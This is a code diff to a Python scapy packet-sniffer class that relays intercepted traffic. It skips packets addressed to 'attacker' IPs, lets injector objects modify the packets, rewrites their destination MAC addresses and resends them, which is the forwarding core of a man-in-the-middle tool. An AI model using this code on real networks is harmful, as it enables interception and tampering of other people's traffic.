@@ -1,6 +1,6 @@
 import threading
 
-from scapy.all import sniff, wireshark
+from scapy.all import sniff, wireshark, copy, send
 from scapy.layers.inet import IP
 from scapy.layers.l2 import Ether, sendp
 
@@ -34,21 +34,24 @@ class PacketSniffer(threading.Thread):
     def _handle_packet(self, packet):
         # type: (Ether) -> None
 
-        # Run the packet along all filters
-        if self.packet_filter.is_filtered(packet):
-            # self._stored_packets.append(packet)
-            pass
+        # Get the string version of all filters
+        as_string = self.packet_filter.to_string(packet)
+        if as_string is not None:
+            print("vvvvvvvvvvvvvvvvvvvvvv")
+            print(as_string)
+            print("^^^^^^^^^^^^^^^^^^^^^^")
 
         # Only consider packets with an IP part.
-        if IP in packet:
+        ip = packet.getlayer('IP')
+        if ip is not None:
             # Do not relay packets for ourselves
-            if packet[IP].dst in self._attacker_ips:
+            if ip.dst in self._attacker_ips:
                 return
 
             # Try to lookup the actual mac address of the package
-            target_dst = self._ip_to_mac.get(packet[IP].dst)
+            target_dst = self._ip_to_mac.get(ip.dst)
             if target_dst is None:
-                print('received a packet for an unknown host (%s)' % packet[IP].dst)
+                print('received a packet for an unknown host (%s)' % ip.dst)
                 return
 
             # Ignore packets which are already targeted correctly, since either we generated
@@ -57,11 +60,10 @@ class PacketSniffer(threading.Thread):
 
                 # Allow the injectors to modify the packet
                 for injector in self.packet_injectors:
-                    result = injector.inject(packet)
+                    result = injector.inject(packet.copy())
                     if result is not None:
-                        wireshark([packet, result])
                         packet = result
 
-                print('redirecting a packet from %s (%s) to %s' % (packet.dst, packet[IP].dst, target_dst))
+                print('redirecting a packet from %s (%s) to %s' % (packet.dst, ip.dst, target_dst))
                 packet.dst = target_dst
                 sendp(packet)
